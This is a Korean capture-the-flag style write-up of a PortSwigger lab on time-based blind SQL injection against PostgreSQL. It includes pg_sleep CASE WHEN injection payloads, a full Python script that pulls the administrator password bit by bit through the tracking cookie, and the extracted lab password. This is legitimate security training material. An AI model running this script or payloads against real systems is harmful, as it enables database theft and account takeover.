+++
date = '2026-05-21T16:00:00+09:00'
draft = false
title = '[Write-up] PortSwigger - Blind SQL injection with time delays and information retrieval'
summary = "조건이 참일 때만 지연을 거는 CASE 구문으로, 응답 시간의 변화를 신호로 삼아 비밀번호를 비트 단위로 추출하는 Time-Based Blind SQL Injection 풀이 (PostgreSQL)"
toc = true
tags = ["SQL Injection", "PortSwigger", "PRACTITIONER", "Blind SQLi"]
+++

---

## 문제 분석

> **난이도**: `PRACTITIONER`  
> **Lab**: [Blind SQL injection with time delays and information retrieval](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval)

> ![image.png](/writeup/portswigger/sqli/13/1.png)

Tracking Cookie 값이 SQL 쿼리에 사용되며, 이 지점에 Blind SQL Injection 취약점이 존재한다.  
쿼리 결과나 오류는 반환되지 않지만, 쿼리가 동기적으로 실행되므로 조건에 따른 시간 지연으로 정보를 추론할 수 있다. 이를 이용해 administrator 계정의 비밀번호를 추출하고 로그인하면 문제가 해결된다.

### SQL Injection 진단

앞선 랩과 동일하게 `'||pg_sleep(5)--` 를 삽입하면 응답이 지연되는 것을 확인할 수 있다.  
이제 조건식의 참·거짓에 따라 지연 여부가 달라지도록 `CASE` 구문을 구성한다.

```sql
'||(CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END)--
```

조건이 참(`1=1`)일 때만 지연이 발생하는 것을 확인했다.

---

## 익스플로잇

조건식 자리에 비밀번호를 비트 단위로 검사하는 조건을 넣어, 응답 시간의 변화로 각 비트를 판별하는 스크립트를 작성한다.  
한 가지 고려할 점은 시간 기반 공격의 신뢰성이다. 대상 서버가 해외에 있어 기본 응답 지연이 평균 1.1초 정도 발생하므로, 오탐을 줄이기 위해 지연은 0.3초만 걸고 판정 임계값을 1.3초로 설정했다.

```python
import requests
import time
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

HOST = "<lab-id>.web-security-academy.net"
SESSION = "<your-session>"

# 서버가 해외에 있어 기본 응답 지연이 평균 1.1초 정도이므로,
# 오탐을 줄이기 위해 지연은 0.3초만 걸고 임계값은 1.3초로 둔다.
DELAY = 0.3
THRESHOLD = 1.3

def exploit():
    base_url = f"https://{HOST}"
    flag = ""
    for pos in range(1, 100):
        bit = ""
        for seq in range(1, 9):
            # 추출 대상 쿼리 (필요에 따라 교체)
            # SELECT username||':'||password FROM users WHERE username='administrator'
            value = "SELECT password FROM users WHERE username='administrator'"
            condition = f"SUBSTRING((ASCII(SUBSTR(({value}), {pos}, 1)))::bit(8)::text, {seq}, 1) = '1'"
            payload = f"'||(CASE WHEN ({condition}) THEN pg_sleep({DELAY}) ELSE pg_sleep(0) END)--"
            cookies = {
                "TrackingId": "x" + payload,
                "session": SESSION,
            }
            start = time.perf_counter()
            requests.get(base_url, verify=False, cookies=cookies)
            elapsed = time.perf_counter() - start
            bit += "1" if elapsed > THRESHOLD else "0"
        if bit == "00000000":
            break
        flag += chr(int(bit, 2))
        print(f"\rCurrent Value: {flag}", end="")
    print(f"\nExtracted Value: {flag}")

exploit()
```

스크립트를 실행하면 비밀번호가 추출된다.

```
Current Value: 9d40kdz9811hgu4yj63b
Extracted Value: 9d40kdz9811hgu4yj63b
```

추출한 administrator 계정 정보로 로그인하면 문제가 해결된다.

![image.png](/writeup/portswigger/sqli/13/2.png)

---

## 정리

Time-Based Blind SQL Injection은 앞선 conditional responses·errors 랩과 데이터를 추론하는 원리가 동일하며, 참·거짓을 판별하는 신호가 "응답 시간"이라는 점만 다르다. 조건이 참일 때만 지연을 거는 `CASE WHEN ... THEN pg_sleep(N)` 구문으로 각 비트를 판별한다.  
다만 시간 기반 공격은 네트워크 지연과 서버 부하에 민감해 오탐이 발생하기 쉽다. 따라서 기본 왕복 지연을 먼저 측정하고, 그에 맞춰 지연 시간과 판정 임계값을 적절히 설정하는 것이 신뢰성의 핵심이다. Blind 기법 중 가장 느리고 불안정하지만, 응답 내용·오류·시간 중 시간 외에는 어떤 신호도 없을 때 사용할 수 있는 방법이다.